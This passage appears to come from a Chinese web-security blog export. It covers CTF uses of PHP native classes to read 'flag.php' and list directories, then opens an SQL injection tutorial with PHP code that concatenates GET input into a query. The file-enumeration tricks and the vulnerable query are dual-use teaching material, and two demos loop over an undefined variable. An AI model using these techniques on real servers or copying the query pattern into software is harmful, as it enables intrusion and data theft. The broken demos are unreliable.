    <span class="token keyword">public</span> <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>											<span class="token comment"># 将输出刷新到文件</span>
    <span class="token keyword">public</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>									<span class="token comment"># 从文件中获取字符</span>
    <span class="token keyword">public</span> <span class="token function">fgetcsv</span><span class="token punctuation">(</span>
        <span class="token keyword type-hint">string</span> <span class="token variable">$separator</span> <span class="token operator">=</span> <span class="token string double-quoted-string">","</span><span class="token punctuation">,</span> 
        <span class="token keyword type-hint">string</span> <span class="token variable">$enclosure</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">,</span> 
        <span class="token keyword type-hint">string</span> <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"\\"</span>
    <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>													<span class="token comment"># 从文件中获取行并解析为 CSV 字段</span>
    <span class="token keyword">public</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>											<span class="token comment"># 从文件中获取行</span>
    <span class="token keyword">public</span> <span class="token function">fgetss</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$allowable_tags</span> <span class="token operator">=</span> <span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>				<span class="token comment"># 从文件中获取行并去除 HTML 标记</span>
    <span class="token keyword">public</span> <span class="token function">flock</span><span class="token punctuation">(</span><span class="token keyword type-hint">int</span> <span class="token variable">$operation</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$wouldBlock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>		<span class="token comment"># 便携式文件锁定</span>
    <span class="token keyword">public</span> <span class="token function">fpassthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>											<span class="token comment"># 输出文件指针上的所有剩余数据</span>
    <span class="token keyword">public</span> <span class="token function">fputcsv</span><span class="token punctuation">(</span>
        <span class="token keyword type-hint">array</span> <span class="token variable">$fields</span><span class="token punctuation">,</span>
        <span class="token keyword type-hint">string</span> <span class="token variable">$separator</span> <span class="token operator">=</span> <span class="token string double-quoted-string">","</span><span class="token punctuation">,</span>
        <span class="token keyword type-hint">string</span> <span class="token variable">$enclosure</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">,</span>
        <span class="token keyword type-hint">string</span> <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"\\"</span><span class="token punctuation">,</span>
        <span class="token keyword type-hint">string</span> <span class="token variable">$eol</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"\n"</span>
    <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>													<span class="token comment"># 将字段数组写入 CSV 行</span>
    <span class="token keyword">public</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token keyword type-hint">int</span> <span class="token variable">$length</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>							<span class="token comment"># 从文件中读取</span>
    <span class="token keyword">public</span> <span class="token function">fscanf</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$format</span><span class="token punctuation">,</span> <span class="token keyword type-declaration">mixed</span> <span class="token operator">&amp;</span><span class="token operator">...</span><span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">int</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>	<span class="token comment"># 根据格式解析来自文件的输入</span>
    <span class="token keyword">public</span> <span class="token function">fseek</span><span class="token punctuation">(</span><span class="token keyword type-hint">int</span> <span class="token variable">$offset</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$whence</span> <span class="token operator">=</span> <span class="token constant">SEEK_SET</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>			<span class="token comment"># 寻找一个位置</span>
    <span class="token keyword">public</span> <span class="token function">fstat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>											<span class="token comment"># 获取有关文件的信息</span>
    <span class="token keyword">public</span> <span class="token function">ftell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>										<span class="token comment"># 返回当前文件位置</span>
    <span class="token keyword">public</span> <span class="token function">ftruncate</span><span class="token punctuation">(</span><span class="token keyword type-hint">int</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>								<span class="token comment"># 将文件截断为给定长度</span>
    <span class="token keyword">public</span> <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>			<span class="token comment"># 写入文件</span>
    <span class="token keyword">public</span> <span class="token function">getCsvControl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>									<span class="token comment"># 获取 CSV 的分隔符、外壳和转义字符</span>
    <span class="token keyword">public</span> <span class="token function">getFlags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>											<span class="token comment"># 获取 SplFileObject 的标志</span>
    <span class="token keyword">public</span> <span class="token function">getMaxLineLen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>										<span class="token comment"># 获取最大行长</span>
    <span class="token keyword">public</span> <span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>												<span class="token comment"># 获取行号</span>
    <span class="token keyword">public</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>												<span class="token comment"># 读取下一行</span>
    <span class="token keyword">public</span> <span class="token function">rewind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>											<span class="token comment"># 将文件倒回第一行</span>
    <span class="token keyword">public</span> <span class="token function">seek</span><span class="token punctuation">(</span><span class="token keyword type-hint">int</span> <span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>									<span class="token comment"># 寻找指定行</span>
    <span class="token keyword">public</span> <span class="token function">setCsvControl</span><span class="token punctuation">(</span>
        <span class="token keyword type-hint">string</span> <span class="token variable">$separator</span> <span class="token operator">=</span> <span class="token string double-quoted-string">","</span><span class="token punctuation">,</span> 
        <span class="token keyword type-hint">string</span> <span class="token variable">$enclosure</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">,</span> 
        <span class="token keyword type-hint">string</span> <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"\\"</span>
    <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>															<span class="token comment"># 设置 CSV 的分隔符、外壳和转义字符</span>
    <span class="token keyword">public</span> <span class="token function">setFlags</span><span class="token punctuation">(</span><span class="token keyword type-hint">int</span> <span class="token variable">$flags</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>								<span class="token comment"># 设置 SplFileObject 的标志</span>
    <span class="token keyword">public</span> <span class="token function">setMaxLineLen</span><span class="token punctuation">(</span><span class="token keyword type-hint">int</span> <span class="token variable">$maxLength</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>						<span class="token comment"># 设置最大行长</span>
<span class="token punctuation">&#125;</span></code></pre>

<ul>
<li>演示</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SplFileObject</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220430142128514.png" class="" title="image-20220430142128514" loading="lazy">

<h2 id="DirectoryIterator-类"><a href="#DirectoryIterator-类" class="headerlink" title="DirectoryIterator 类"></a>DirectoryIterator 类</h2><p><a href="https://www.php.net/manual/en/class.directoryiterator.php">DirectoryIterator</a> 类提供了一个简单的界面来查看文件系统目录的内容。该类的构造方法将会创建一个指定目录的<strong>迭代器</strong>。</p>
<blockquote>
<p>适用于 PHP 5 &#x2F; 7 &#x2F; 8</p>
</blockquote>
<p>此类继承于 <a href="https://www.php.net/manual/en/class.splfileinfo.php">SplFileInfo</a> 类。</p>
<ul>
<li>摘要（部分）：</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">DirectoryIterator</span> <span class="token keyword">extends</span> <span class="token class-name">SplFileInfo</span> <span class="token keyword">implements</span> <span class="token class-name">SeekableIterator</span> <span class="token punctuation">&#123;</span>
    
    <span class="token comment">/* Methods */</span>
    <span class="token keyword">public</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$directory</span><span class="token punctuation">)</span>				<span class="token comment"># 从路径构造一个新的目录迭代器</span>
    <span class="token keyword">public</span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span>								<span class="token comment"># 返回当前的项</span>
    <span class="token keyword">public</span> <span class="token function">getATime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>								<span class="token comment"># 获取当前项的最后访问时间</span>
    <span class="token keyword">public</span> <span class="token function">getBasename</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$suffix</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>		<span class="token comment"># 获取当前项目的基本名称</span>
    <span class="token keyword">public</span> <span class="token function">getCTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>								<span class="token comment"># 获取当前项的 inode 更改时间</span>
    <span class="token keyword">public</span> <span class="token function">getExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>						<span class="token comment"># 获取文件扩展名</span>
    <span class="token keyword">public</span> <span class="token function">getFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>						<span class="token comment"># 返回当前项的文件名</span>
    <span class="token keyword">public</span> <span class="token function">getGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>								<span class="token comment"># 获取当前项目的组</span>
    <span class="token keyword">public</span> <span class="token function">getInode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>								<span class="token comment"># 获取当前项的 inode</span>
    <span class="token keyword">public</span> <span class="token function">getMTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>								<span class="token comment"># 获取当前项的最后修改时间</span>
    <span class="token keyword">public</span> <span class="token function">getOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>								<span class="token comment"># 获取当前项的所有者</span>
    <span class="token keyword">public</span> <span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>							<span class="token comment"># 获取当前迭代器项的路径，不带文件名</span>
    <span class="token keyword">public</span> <span class="token function">getPathname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>						<span class="token comment"># 返回当前项的路径和文件名</span>
    <span class="token keyword">public</span> <span class="token function">getPerms</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>								<span class="token comment"># 获取当前项的权限</span>
    <span class="token keyword">public</span> <span class="token function">getSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>								<span class="token comment"># 获取当前项的大小</span>
    <span class="token keyword">public</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>							<span class="token comment"># 确定当前项的类型</span>
    <span class="token keyword">public</span> <span class="token function">isDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>								<span class="token comment"># 确定当前项是否为目录</span>
    <span class="token keyword">public</span> <span class="token function">isDot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>								<span class="token comment"># 确定当前项目是否为 '.' 或者 '..'</span>
    <span class="token keyword">public</span> <span class="token function">isExecutable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>							<span class="token comment"># 确定当前项是否可执行</span>
    <span class="token keyword">public</span> <span class="token function">isFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>								<span class="token comment"># 确定当前项是否为常规文件</span>
    <span class="token keyword">public</span> <span class="token function">isLink</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>								<span class="token comment"># 确定当前项是否为符号链接</span>
    <span class="token keyword">public</span> <span class="token function">isReadable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>							<span class="token comment"># 确定当前项目是否可以读取</span>
    <span class="token keyword">public</span> <span class="token function">isWritable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>							<span class="token comment"># 确定当前项目是否可以写入</span>
    <span class="token keyword">public</span> <span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span>									<span class="token comment"># 返回当前项的键</span>
    <span class="token keyword">public</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>									<span class="token comment"># 前进到下一个项</span>
    <span class="token keyword">public</span> <span class="token function">rewind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>								<span class="token comment"># 将 DirectoryIterator 倒回到起点</span>
    <span class="token keyword">public</span> <span class="token function">seek</span><span class="token punctuation">(</span><span class="token keyword type-hint">int</span> <span class="token variable">$offset</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>						<span class="token comment"># 寻找项目</span>
    <span class="token keyword">public</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>							<span class="token comment"># 获取文件名作为字符串</span>
    <span class="token keyword">public</span> <span class="token function">valid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>								<span class="token comment"># 检查当前位置是否为有效文件</span>
<span class="token punctuation">&#125;</span></code></pre>

<ul>
<li>演示</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>经过遍历可以得到整个根目录下的文件，我这里是D盘，所以输出了我D盘下的所有文件及文件夹。</p>
<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220430125812016.png" class="" title="image-20220430125812016" loading="lazy">

<p>结合<code>glob://</code>协议可以搜索文件：</p>
<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220430130332538.png" class="" title="image-20220430130332538" loading="lazy">

<h2 id="FilesystemIterator-类"><a href="#FilesystemIterator-类" class="headerlink" title="FilesystemIterator 类"></a>FilesystemIterator 类</h2><p><a href="https://www.php.net/manual/en/class.filesystemiterator.php">FilesystemIterator</a> 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的<strong>迭代器</strong>。</p>
<blockquote>
<p>适用于 PHP &gt;&#x3D; 5.3.0 &#x2F; 7 &#x2F; 8</p>
</blockquote>
<p>此类继承于 DirectoryIterator 类。</p>
<ul>
<li>摘要：</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">FilesystemIterator</span> <span class="token keyword">extends</span> <span class="token class-name">DirectoryIterator</span> <span class="token punctuation">&#123;</span>
    
    <span class="token comment">/* Constants */</span>
    <span class="token keyword">const</span> <span class="token keyword type-declaration">int</span> <span class="token constant">CURRENT_AS_PATHNAME</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword type-declaration">int</span> <span class="token constant">CURRENT_AS_FILEINFO</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword type-declaration">int</span> <span class="token constant">CURRENT_AS_SELF</span> <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword type-declaration">int</span> <span class="token constant">CURRENT_MODE_MASK</span> <span class="token operator">=</span> <span class="token number">240</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword type-declaration">int</span> <span class="token constant">KEY_AS_PATHNAME</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword type-declaration">int</span> <span class="token constant">KEY_AS_FILENAME</span> <span class="token operator">=</span> <span class="token number">256</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword type-declaration">int</span> <span class="token constant">FOLLOW_SYMLINKS</span> <span class="token operator">=</span> <span class="token number">512</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword type-declaration">int</span> <span class="token constant">KEY_MODE_MASK</span> <span class="token operator">=</span> <span class="token number">3840</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword type-declaration">int</span> <span class="token constant">NEW_CURRENT_AND_KEY</span> <span class="token operator">=</span> <span class="token number">256</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword type-declaration">int</span> <span class="token constant">SKIP_DOTS</span> <span class="token operator">=</span> <span class="token number">4096</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword type-declaration">int</span> <span class="token constant">UNIX_PATHS</span> <span class="token operator">=</span> <span class="token number">8192</span><span class="token punctuation">;</span>
    
    <span class="token comment">/* Methods */</span>
    <span class="token keyword">public</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$directory</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token class-name static-context">FilesystemIterator</span><span class="token operator">::</span><span class="token class-name">KEY_AS_PATHNAME</span> <span class="token operator">|</span> <span class="token class-name">FilesystemIterator</span><span class="token operator">::</span><span class="token class-name">CURRENT_AS_FILEINFO</span> <span class="token operator">|</span> <span class="token class-name">FilesystemIterator</span><span class="token operator">::</span><span class="token constant">SKIP_DOTS</span><span class="token punctuation">)</span>		<span class="token comment"># 构造一个新的文件系统迭代器</span>
    <span class="token keyword">public</span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token class-name">SplFileInfo</span><span class="token operator">|</span><span class="token class-name">FilesystemIterator</span>		<span class="token comment"># 当前文件</span>
    <span class="token keyword">public</span> <span class="token function">getFlags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>										<span class="token comment"># 获取处理标志</span>
    <span class="token keyword">public</span> <span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>										<span class="token comment"># 检索当前文件的密钥</span>
    <span class="token keyword">public</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>											<span class="token comment"># 移动到下一个文件</span>
    <span class="token keyword">public</span> <span class="token function">rewind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>										<span class="token comment"># 倒回到开头</span>
    <span class="token keyword">public</span> <span class="token function">setFlags</span><span class="token punctuation">(</span><span class="token keyword type-hint">int</span> <span class="token variable">$flags</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>							<span class="token comment"># 设置处理标志</span>
<span class="token punctuation">&#125;</span></code></pre>

<ul>
<li>演示</li>
</ul>
<p>除了方法不同，用法什么的跟 DirectoryIterator 类相同，这里就不赘述。</p>
<h2 id="GlobIterator-类"><a href="#GlobIterator-类" class="headerlink" title="GlobIterator 类"></a>GlobIterator 类</h2><p><a href="https://www.php.net/manual/zh/class.globiterator.php">GlobIterator</a> 类用于遍历一个文件系统行为类似于 <a href="https://www.php.net/manual/zh/function.glob.php">glob()</a>。</p>
<blockquote>
<p>适用于 PHP &gt;&#x3D; 5.3.0 &#x2F; 7 &#x2F; 8</p>
</blockquote>
<p>此类继承于 FilesystemIterator 类。</p>
<ul>
<li>摘要：</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">GlobIterator</span> <span class="token keyword">extends</span> <span class="token class-name">FilesystemIterator</span> <span class="token keyword">implements</span> <span class="token class-name">Countable</span> <span class="token punctuation">&#123;</span>
   
    <span class="token comment">/* 方法 */</span>
    <span class="token keyword">public</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token class-name static-context">FilesystemIterator</span><span class="token operator">::</span><span class="token class-name">KEY_AS_PATHNAME</span> <span class="token operator">|</span> <span class="token class-name">FilesystemIterator</span><span class="token operator">::</span><span class="token constant">CURRENT_AS_FILEINFO</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>
    
<span class="token punctuation">&#125;</span></code></pre>

<ul>
<li>演示</li>
</ul>
<p>用法与 <code>glob()</code> 函数相同。</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>可以根据部分文件名匹配文件或文件夹。</p>
<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220430133003133.png" class="" title="image-20220430133003133" loading="lazy">

]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2021/08/30/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>注入漏洞</strong>在web前十漏洞中位居榜首，其中SQL注入最为经典。</p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h2><p>SQL注入漏洞是指攻击者通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，而网站应用程序未对其进行过滤，将恶意SQL语句带入数据库使恶意SQL语句得以执行，从而使攻击者通过数据库获取敏感信息或者执行其他恶意操作。</p>
<p>SQL注入漏洞可能会导致服务器的数据库信息泄露、数据被窃取、网页被篡改，甚至可能会造成网站被挂马、服务器被远程控制、被上后门等。</p>
<ul>
<li>以下是SQL注入漏洞的示例代码</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">...</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = <span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span></code></pre>

<p>中间件通过GET传入用户指定的<code>id</code>参数，并赋值给<code>$id</code>变量，<code>$id</code>在后面没有任何过滤，直接拼接到SQL语句中，然后在数据库中执行了此SQL语句。</p>
<h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><p>SQL注入按数据类型分为数字型注入和字符型注入</p>
<h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>数字型注入就是注入点的数据类型为数字型，<strong>没有</strong>用单引号或者双引号括起来。</p>
<p>典型代码示例</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">...</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = <span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span></code></pre>

<p>判断方法：</p>
<ol>
<li>输入单引号时，不正常返回</li>
</ol>
